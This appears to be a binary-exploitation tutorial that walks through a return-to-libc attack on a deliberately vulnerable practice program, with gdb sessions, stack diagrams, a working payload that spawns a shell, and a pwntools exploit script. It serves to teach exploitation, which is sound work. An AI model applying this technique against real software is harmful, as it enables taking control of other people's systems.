# Bypass security techniques

Here, you will learn new techniques to exploit the programs that contain security mechanisms.

## Return to libc attack

This attack includes searching addresses of useful functions within libc.

Again, consider our old stack-overflow program and determine the offset to return address within gdb:
```bash
gef➤  r < <(python -c 'print "A"*262 + "B"*4')
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx < <(python -c 'print "A"*262 + "B"*4')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Now, find addresses within libc. An easy and always useful function to use in the exploit is a `system`, then, you need string `/bin/sh` as an argument to it and last function `exit`.

```bash
gef➤  b *main
Breakpoint 1 at 0x8049243
gef➤  r
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx

Breakpoint 1, 0x08049243 in main ()
gef➤  print system
$2 = {<text variable, no debug info>} 0xf7e02830 <system>
gef➤  print exit
$3 = {<text variable, no debug info>} 0xf7df5170 <exit>
gef➤  search-pattern /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx'(0x804a000-0x804b000), permission=r--
  0x804a008 - 0x804a00f  →   "/bin/sh"
[+] In '/home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx'(0x804b000-0x804c000), permission=r--
  0x804b008 - 0x804b00f  →   "/bin/sh"
[+] In '/lib/i386-linux-gnu/libc-2.31.so'(0xf7f35000-0xf7fa5000), permission=r--
  0xf7f4f352 - 0xf7f4f359  →   "/bin/sh"
gef➤  
```

Thus, you have the address of `system`, `exit`, and `/bin/sh` for the system as an argument. You just need to figure out how the stack works when you call a few functions in a row.

Usual stack view:
```
|        unused space       |
----------------------------- <--- some_func2()
|       func variables      |
-----------------------------
|         saved ebp         |
-----------------------------
|     saved ret address     |
-----------------------------
|       func arguments      |
----------------------------- <--- some_func() that calls some_func2()
|  previous func variables  |
-----------------------------
|      prev. saved ebp      |
-----------------------------
|  prev. saved ret address  |
-----------------------------
|    prev. func arguments   |
-----------------------------
```

The stack when you do a ret2libc attack:
```
|        unused space       |
-----------------------------
|AAAAAAAAAAAAAAAAAAAAAAAAAAA|
-----------------------------
|AAAAAAAAAAAAAAAAAAAAAAAAAAA|
-----------------------------
|AAAAAAAAAAAAAAAAAAAAAAAAAAA|
-----------------------------
|AAAAAAAAAAAAAAAAAAAAAAAAAAA|
-----------------------------
| ret address to the system | <--- this is a place where the ret address stored for the current function(some function, whatever)
-----------------------------
|  ret address to the exit  |
-----------------------------
|    address of /bin/sh     |
-----------------------------
| null as end of input str. |
-----------------------------
```

After the first jump to the system function:
```
|        empty space        |
-----------------------------
|  ret address to the exit  | <--- this is a place where the ret address stored for the current function(system)
-----------------------------
|    address of /bin/sh     | <--- is considered as the first argument to the system
-----------------------------
| null as end of input str. |
-----------------------------
```

After the second jump to the exit function:
```
-----------------------------
| null as end of input str. | <--- as an argument to exit or exit with 0 code.
-----------------------------
|       something else      |
```

So, the final exploit will be just with all three correct address:
```bash
gef➤  r < <(python -c 'print "A"*262 + "\x30\x28\xe0\xf7" + "\x70\x51\xdf\xf7" + "\x52\xf3\xf4\xf7"')
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx < <(python -c 'print "A"*262 + "\x30\x28\xe0\xf7" + "\x70\x51\xdf\xf7" + "\x52\xf3\xf4\xf7"')
[Detaching after vfork from child process 5366]
[Inferior 1 (process 5363) exited normally]
gef➤
```

You can see, that we executed child process. Try it outside gdb:
```bash
$ (python -c 'print "A"*262 + "\x30\x28\xe0\xf7" + "\x70\x51\xdf\xf7" + "\x52\xf3\xf4\xf7"'; cat) | ./stack-overflow-with-nx
w
 21:17:33 up 36 min,  1 user,  load average: 0.46, 0.37, 0.37
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shogun   tty7     :0               20:41   36:03   1:15   1.39s xfce4-session

```

Attack with `pwntools`:
```python
from pwn import *


# start the vuln program
p = process('./stack-overflow-with-nx')
system_addr = p32(0xf7e02830)
exit_addr = p32(0xf7df5170)
bin_sh_addr = p32(0xf7f4f352)
payload = b'A' * 262
payload += system_addr
payload += exit_addr
payload += bin_sh_addr
p.sendline(payload)
p.interactive()
```

For security such as ASLR, this will not work, because it will also randomize the addresses of key functions and arguments for this attack.
